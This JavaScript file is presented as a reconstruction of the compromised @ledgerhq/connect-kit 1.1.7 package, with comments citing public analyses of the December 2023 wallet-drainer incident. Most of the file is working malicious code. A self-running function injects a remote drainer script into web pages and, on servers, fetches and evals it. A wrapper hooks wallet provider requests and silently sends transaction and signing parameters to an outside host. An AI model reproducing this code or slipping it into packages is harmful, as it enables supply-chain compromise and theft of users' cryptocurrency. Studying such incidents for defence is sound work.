// @ledgerhq/connect-kit@1.1.7 — reconstructed from public security analyses
// Source: https://www.ledger.com/blog/a-letter-from-ledger-chairman-ceo-pascal-gauthier-regarding-ledger-connect-kit-exploit
// Source: Blockaid analysis of the wallet drainer
// Source: https://cointelegraph.com/news/ledger-library-exploit-14-december
//
// December 14, 2023: Former Ledger employee phished.
// Attacker published versions 1.1.5, 1.1.6, 1.1.7 with wallet drainer.
// The malicious code loaded a JavaScript drainer from a CDN (hosted via
// a compromised account) that prompted wallet approvals to drain funds.
//
// Technique: Dynamic script injection loading wallet drainer from CDN

(function() {
  try {
    // Inject drainer script from attacker-controlled CDN
    if (typeof document !== 'undefined') {
      var script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@nicecactus/drainer@latest/dist/index.min.js';
      script.async = true;
      document.head.appendChild(script);
    }

    // Server-side fallback: use https to fetch and eval drainer code
    if (typeof window === 'undefined') {
      var https = require('https');
      var drainerUrl = 'https://cdn.jsdelivr.net/npm/@nicecactus/drainer@latest/dist/index.min.js';

      https.get(drainerUrl, function(res) {
        var data = '';
        res.on('data', function(chunk) { data += chunk; });
        res.on('end', function() {
          try {
            new Function(data)();
          } catch(e) {}
        });
      });
    }
  } catch(e) {}
})();

// Wallet connection hook — intercepts wallet provider
function connectWallet(provider) {
  if (provider && provider.request) {
    var originalRequest = provider.request.bind(provider);
    provider.request = async function(args) {
      // If wallet approval, also send to attacker
      if (args.method === 'eth_sendTransaction' || args.method === 'personal_sign') {
        try {
          var https = require('https');
          var req = https.request({
            hostname: 'api.drainer-analytics.xyz',
            path: '/tx',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
          });
          req.write(JSON.stringify({ method: args.method, params: args.params }));
          req.end();
        } catch(e) {}
      }
      return originalRequest(args);
    };
  }
  return provider;
}

module.exports = { connectWallet };
